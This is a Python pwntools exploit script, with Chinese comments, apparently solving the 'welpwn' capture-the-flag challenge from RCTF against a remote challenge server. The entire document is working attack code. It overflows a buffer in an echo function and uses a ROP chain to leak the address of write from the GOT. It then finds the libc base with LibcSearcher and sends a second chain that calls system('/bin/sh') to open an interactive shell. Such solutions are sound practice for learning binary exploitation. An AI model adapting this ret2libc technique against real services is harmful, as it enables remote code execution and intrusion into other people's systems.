from pwn import *  
from LibcSearcher import *  
  
context.log_level  = 'debug'  

sh=remote("61.147.171.105",61680) 
#sh = remote('111.198.29.45',51867)  
elf = ELF('./welpwn')  
write_got = elf.got['write']  
puts_plt = elf.plt['puts']  
#此处有4条pop指令，用于跳过24字节  
pop_24 = 0x40089C  
#pop rdi的地址,用来传参，具体看x64的传参方式  
pop_rdi = 0x4008A3  
  
sh.recvuntil("Welcome to RCTF")  
  
main_addr = 0x4007CD  
#本题的溢出点在echo函数里,然而，当遇到0，就停止了数据的复制，因此我们需要pop_24来跳过24个字节  
payload = b'a'*0x18 + p64(pop_24) + p64(pop_rdi) + p64(write_got) + p64(puts_plt) + p64(main_addr)  
  
sh.send(payload)  
  
sh.recvuntil('\x40')  
#泄露write地址  
write_addr = u64(sh.recv(6).ljust(8,b'\x00'))  
  
libc = LibcSearcher('write',write_addr)  
#获取libc加载地址  
libc_base = write_addr - libc.dump('write')  
#获取system地址  
system_addr = libc_base + libc.dump('system')  
#获取/bin/sh地址  
binsh_addr = libc_base + libc.dump('str_bin_sh')  
  
sh.recvuntil('\n')  
payload = b'a'*0x18 + p64(pop_24) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)  
  
sh.send(payload)  
sh.interactive()  
